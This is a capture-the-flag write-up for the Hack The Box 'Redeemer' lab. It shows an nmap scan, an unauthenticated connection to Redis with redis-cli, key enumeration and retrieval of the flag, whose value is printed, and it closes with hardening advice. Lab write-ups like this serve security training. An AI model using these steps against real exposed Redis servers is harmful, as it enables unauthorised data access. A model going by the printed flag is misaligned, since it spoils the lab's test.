# CTF Writeup: Redeemer(HTB)
## Overview

This report details the process and findings from a Capture The Flag (CTF) challenge targeting a host running a Redis service. The objective was to enumerate, access, and extract sensitive information from the Redis instance.

---

## Table of Contents

- [Target Information](#target-information)
- [Enumeration](#enumeration)
- [Redis Interaction](#redis-interaction)
- [Flag Extraction](#flag-extraction)
- [Conclusion](#conclusion)

---

## Target Information

- **IP Address:** `10.129.136.187`
- **Service Identified:** Redis 5.0.7 (TCP/6379)
- **Operating System:** Linux 5.4.0-77-generic x86_64

---

## Enumeration

### 1. Port Scanning

A comprehensive Nmap scan was performed to identify open ports and running services.

```bash
nmap -Pn -A -sV -sC -p- 10.129.136.187 -vvv -oN nmap.txt
````

**Key Findings:**

- **Port 6379/tcp:** Open, running Redis key-value store (version 5.0.7)
- **OS Detection:** Linux 4.X/5.X
- **No other open ports detected**

---

## Redis Interaction

### 2. Connecting to Redis

Connected to the Redis service using the `redis-cli` tool:

Bash

```
redis-cli -h 10.129.136.187
```

### 3. Gathering Server Information

Executed the `INFO` command to enumerate server details:

redis

```
info
```

**Notable Output:**

- **Redis Version:** 5.0.7
- **Operating System:** Linux 5.4.0-77-generic x86_64
- **Number of Keys:** 4 (in db0)
- **Role:** Master

### 4. Enumerating Keys

Selected the default database and listed all keys:

redis

```
select 0
keys *
```

**Keys Found:**

- numb
- flag
- stor
- temp

---

## Flag Extraction

### 5. Retrieving the Flag

Accessed the value of the `flag` key:

redis

```
get flag
```

**Flag Obtained:**

text

```
03e1d2b376c37ab3f5319922053953eb
```

---

## Conclusion

The Redis service was found to be accessible without authentication, allowing enumeration and extraction of sensitive data. The flag was successfully retrieved from the `flag` key in the Redis database.

---

## Recommendations

- **Restrict Redis Access:** Bind Redis to localhost or implement firewall rules to prevent unauthorized remote access.
- **Enable Authentication:** Configure Redis with a strong password.
- **Regularly Audit Services:** Ensure exposed services are secured and monitored.

---

**Flag:** `03e1d2b376c37ab3f5319922053953eb`
